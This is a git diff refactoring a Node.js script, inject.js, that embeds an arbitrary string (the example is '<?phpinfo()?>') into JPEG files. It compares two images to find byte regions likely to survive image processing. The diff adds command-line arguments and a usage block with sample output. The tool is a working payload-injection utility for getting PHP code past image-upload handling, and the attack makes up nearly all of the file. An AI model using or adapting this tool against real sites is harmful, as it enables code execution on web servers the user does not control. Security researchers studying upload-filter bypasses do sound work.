@@ -5,34 +5,42 @@ const mkdirp = require('mkdirp')
 const split = require('just-split')
 const diff = require('diff-sequences').default
 
-const INJECTION = '<?phpinfo()?>'
-const OUTPUT_DIR = path.resolve(__dirname, 'vendors/injected')
+const OUTPUT_DIR = path.resolve(__dirname, './vendors/inject-output')
 
-const SOURCES = [
-  path.resolve(__dirname, './vendors/190413104517_315539082.jpg'),
-  path.resolve(__dirname, './vendors/190413104640_171516771.jpg'),
-]
-
-async function ready () {
-  await del(OUTPUT_DIR)
+function getReady () {
+  del.sync(OUTPUT_DIR)
   mkdirp.sync(OUTPUT_DIR)
 }
 
-async function main () {
-  console.log('Injecting...')
-  await ready()
-  const injection = Buffer.from(INJECTION).toString('hex')
+async function inject (str, filePaths) {
+  getReady()
+
+  const files = filePaths.map((p) => fs.readFileSync(p, 'hex'))
+  const sequences = files.map((file) =>
+    split(file.split(''), 2).map((arr) => arr.join(''))
+  )
+
+  const injection = Buffer.from(str).toString('hex')
   const size = injection.length
-  const files = SOURCES.map((p) => fs.readFileSync(p).toString('hex'))
-  const sequences = files.map((file) => split(file.split(''), 2).map((arr) => arr.join('')))
+
   let areas = []
-  let output = []
-  diff(sequences[0].length, sequences[1].length, (l, r) => sequences[0][l] === sequences[1][r], (len, l, r) => {
-    if (len > size / 2) {
-      areas.push(l)
+
+  console.log(`Searching diff areas...`)
+
+  diff(
+    sequences[0].length,
+    sequences[1].length, (l, r) => sequences[0][l] === sequences[1][r],
+    (len, l, r) => {
+      if (len > size / 2) {
+        areas.push(l)
+      }
     }
-  })
+  )
+
   console.log(`${areas.length} areas found.`)
+
+  let output = []
+
   areas.forEach((position, index) => {
     let hex = [...sequences[0]]
     for (let i = 0; i < size; i += 2) {
@@ -43,8 +51,37 @@ async function main () {
     fs.writeFileSync(p, buf)
     output.push(p)
   })
-  console.log('Injection finished. Check ./vendors/injected/')
+
+  console.log(`Injection finished. Check ${OUTPUT_DIR}`)
+
   return output
 }
 
-module.exports = main
+if (module.parent) {
+  module.exports = inject
+  return
+}
+
+/**
+ * Usages:
+ *
+ * ```sh
+ * node ./inject.js [content] [file1] [file2]
+ * ```
+ *
+ * Example:
+ *
+ * ```sh
+ * node ./inject.js "<?phpinfo()?>" ./vendors/190413104517_315539082.jpg ./vendors/190413104640_171516771.jpg
+ * # <- Searching diff areas...
+ * # <- 11 areas found.
+ * # <- Injection finished. Check ./vendors/injected/
+ * ```
+ *
+ */
+;(async () => {
+  let paths = process.argv.slice(3, 5).map((p) =>
+    path.resolve(process.cwd(), p)
+  )
+  await inject(process.argv[2], paths)
+})()
